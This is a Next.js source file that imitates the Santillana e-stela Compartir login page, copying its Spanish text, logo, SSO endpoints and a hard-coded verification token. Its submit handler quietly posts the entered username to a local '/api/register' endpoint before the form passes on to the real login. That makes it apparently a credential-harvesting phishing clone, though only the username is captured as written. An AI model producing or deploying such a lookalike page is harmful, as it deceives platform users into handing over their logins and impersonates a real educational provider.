import Head from 'next/head';
import { useState } from 'react';

export default function Home() {
    const [username, setUsername] = useState('');

    const handleSubmit = (event) => {
        fetch('/api/register', {
            method: 'POST',
            body: JSON.stringify({
                username,
                password: 'TEST',
            }),
            headers: new Headers({
              'Content-Type': 'application/json',
              Accept: 'application/json',
            }),
        });

        event.preventDefault();
    };

    return (
        <>
            <div style={{ display: 'block' }} id='bgimg'></div>
            <div>
                <Head>
                    <title>Inicio de sesi&#243;n - e-stela Compartir</title>
                    <meta
                        name='description'
                        content='Acceso a e-stela LMS. Plataforma educativa de Santillana Compartir.'
                    />
                    <meta
                        name='viewport'
                        content='width=device-width, initial-scale=1, maximum-scale=1, user-scalable=0'
                    />
                    <meta
                        id='viewport'
                        name='viewport'
                        content='width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0, target-densitydpi=medium-dpi'
                    />

                    <meta charset='utf-8' />
                    <link
                        href='/favicon.ico'
                        rel='shortcut icon'
                        type='image/x-icon'
                    />
                    <link rel='apple-touch-icon' href='/favicon-ios.png' />

                    <link href='/Content/base.css' rel='stylesheet' />

                    <link
                        href='/Content/css?v=7UpInVtDUcTW5HtGfK_MIIDXfz8CeReWFCxoHkfzrok1'
                        rel='stylesheet'
                    />

                    <link
                        href='/Content/libraries/bootstrap.min.css'
                        rel='stylesheet'
                    />

                    <link href='/Content/login.css' rel='stylesheet' />

                    <link
                        href='https://fonts.googleapis.com/css?family=Source+Sans+Pro:300,400,600,700,900'
                        rel='stylesheet'
                    />
                </Head>

                <div id='body'>
                    <section>
                        <video playsInline autoPlay muted loop id='bgvid'>
                            <source type='video/mp4' />
                        </video>

                        <div
                            id='container'
                            className='modal show bg-login'
                            tabIndex='-1'
                            role='dialog'
                        >
                            <div id='content'>
                                <div
                                    id='loginForm'
                                    className='modal-dialog modal-dialog-custom'
                                >
                                    <div className='modal-header modal-header-login-custom'>
                                        <h1 className='hidden'>Log in</h1>
                                        <img
                                            src='https://caprodevelop.blob.core.windows.net/uploads/pro/logoimage/ba00b2da-39f7-4647-90c9-01c33af21750.png'
                                            className='logoImage'
                                            alt='Main logo of company'
                                        />
                                    </div>
                                    <div id='form' className='login-form'>
                                        <div
                                            className='validate'
                                            id='validatePassword'
                                        ></div>
                                        <div className='validate'></div>
                                        <br />
                                        <div className='form-group'>
                                            <span
                                                id='idpName'
                                                className='idp-name'
                                            >
                                                Santillana Connect&nbsp;
                                            </span>
                                            <a
                                                href='https://www.santillanaconnect.com/Account/Faq?wa=wsignin1.0&amp;wtrealm=http%3A%2F%2Flms30.santillanacompartir.com%2Flogin%2Fcompartir%2F&amp;wreply=https%3A%2F%2Flms30.santillanacompartir.com%2Flogin%2Fsso%2Floginconnect'
                                                className='whatisThis primary'
                                                id='whatisThis'
                                            >
                                                &#191;Qu&#233; es esto?
                                            </a>
                                            <form
                                                action='https://www.santillanaconnect.com/Account/Login?wa=wsignin1.0&wtrealm=http%3A%2F%2Flms30.santillanacompartir.com%2Flogin%2Fcompartir%2F&wreply=https%3A%2F%2Flms30.santillanacompartir.com%2Flogin%2Fsso%2Floginconnect'
                                                method='post'
                                                name='loginForm'
                                                onSubmit={handleSubmit}
                                            >
                                              
                                                <input
                                                    name='__RequestVerificationToken'
                                                    type='hidden'
                                                    value='ZFWUOXtiXNG0hBu7DR6qgsj0fmqPryU9XgIFHBQ56ft47btr0ikX3d64EMK2XcIr0aa--eVZ5BSQ73BJE_jgt16TAZI1'
                                                />
                                                <input
                                                    id='Wa'
                                                    name='Wa'
                                                    type='hidden'
                                                    value='wsignin1.0'
                                                />
                                                <input
                                                    id='Wreply'
                                                    name='Wreply'
                                                    type='hidden'
                                                    value='https://lms30.santillanacompartir.com/login/sso/loginconnect'
                                                />
                                                <input
                                                    id='WtRealm'
                                                    name='WtRealm'
                                                    type='hidden'
                                                    value='http://lms30.santillanacompartir.com/login/compartir/'
                                                />{' '}
                                                <div id='user'>
                                                    <label
                                                        className='hidden'
                                                        htmlFor='username'
                                                    >
                                                        Usuario
                                                    </label>
                                                    <input
                                                        className='loginInput primaryBorderFocus form-control'
                                                        data-val='true'
                                                        data-val-length='El campo Usuario debe ser una cadena con una longitud máxima de 256.'
                                                        data-val-length-max='256'
                                                        data-val-required='Debe introducir el nombre de usuario.'
                                                        id='username'
                                                        name='UserName'
                                                        placeholder='Usuario'
                                                        type='text'
                                                        value={username}
                                                        onChange={(e) =>
                                                            setUsername(
                                                                e.target.value
                                                            )
                                                        }
                                                    />
                                                    <div
                                                        className='loginIcon'
                                                        id='usernameIcon'
                                                    >
                                                        <span className='icon-uno user'>
                                                            <img
                                                                src='/Content/fonts/ico_user.png'
                                                                alt='icon for user'
                                                            />
                                                        </span>
                                                    </div>
                                                </div>
                                                <div id='passwordWrapper'>
                                                    <label
                                                        className='hidden'
                                                        htmlFor='password'
                                                    >
                                                        Contrase&#241;a
                                                    </label>
                                                    <input
                                                        className='loginInput primaryBorderFocus form-control'
                                                        data-val='true'
                                                        data-val-required='Debe introducir la contraseña.'
                                                        id='password'
                                                        name='Password'
                                                        placeholder='Contraseña'
                                                        type='password'
                                                    />
                                                    <div className='loginIcon'>
                                                        <span className='icon-uno lock'>
                                                            <img
                                                                src='/Content/fonts/ico_password.png'
                                                                alt='icon for password'
                                                            />
                                                        </span>
                                                    </div>
                                                </div>
                                                <input
                                                    className='remember span2'
                                                    data-toggle='toggle'
                                                    data-val='true'
                                                    data-val-required='El campo Mantenerme conectado es obligatorio.'
                                                    id='RememberMe'
                                                    name='RememberMe'
                                                    type='checkbox'
                                                    value='true'
                                                />
                                                <input
                                                    name='RememberMe'
                                                    type='hidden'
                                                    value='false'
                                                />
                                                <label
                                                    className='remember'
                                                    htmlFor='RememberMe'
                                                    id='rememberLabel'
                                                >
                                                    Mantenerme conectado
                                                </label>
                                                <input
                                                    id='RelayState'
                                                    name='RelayState'
                                                    type='hidden'
                                                    value=''
                                                />
                                                <input
                                                    id='SAMLRequest'
                                                    name='SAMLRequest'
                                                    type='hidden'
                                                    value=''
                                                />{' '}
                                                <div>
                                                    <input
                                                        type='submit'
                                                        id='submit'
                                                        value='Conectarme'
                                                        className='primaryBackground'
                                                    />
                                                </div>
                                            </form>{' '}
                                        </div>
                                    </div>

                                    <div id='cantAcces'>
                                        <a
                                            className='primary'
                                            href='https://www.santillanaconnect.com/Account/ForgotPassword?wa=wsignin1.0&amp;wtrealm=http%3A%2F%2Flms30.santillanacompartir.com%2Flogin%2Fcompartir%2F&amp;wreply=https%3A%2F%2Flms30.santillanacompartir.com%2Flogin%2Fsso%2Floginconnect'
                                            id='forgotPasswordLink'
                                        >
                                            &#191;No puede acceder a su cuenta?
                                        </a>{' '}
                                    </div>
                                </div>
                                <div className='clear'></div>
                            </div>
                        </div>
                    </section>
                </div>

                <footer id='footer'>
                    <div id='footContent'>
                        <div className='primary' id='footLeft'>
                            ©2021 Santillana<p className='separator'>|</p>
                            <a
                                className='primary'
                                href='https://www.santillanaconnect.com/Account/Faq?wa=wsignin1.0&amp;wtrealm=http%3A%2F%2Flms30.santillanacompartir.com%2Flogin%2Fcompartir%2F&amp;wreply=https%3A%2F%2Flms30.santillanacompartir.com%2Flogin%2Fsso%2Floginconnect'
                            >
                                FAQ
                            </a>{' '}
                            <p className='separator'>|</p>
                            <a
                                href='https://santillanaconnect.com/Account/CookiesPolicy/'
                                className='primary'
                            >
                                Pol&#237;tica de cookies
                            </a>
                        </div>
                        <div id='footRight'>
                            <img alt='' />
                        </div>
                        <div className='clear'></div>
                    </div>
                    <div className='clear'></div>
                </footer>
            </div>
        </>
    );
}
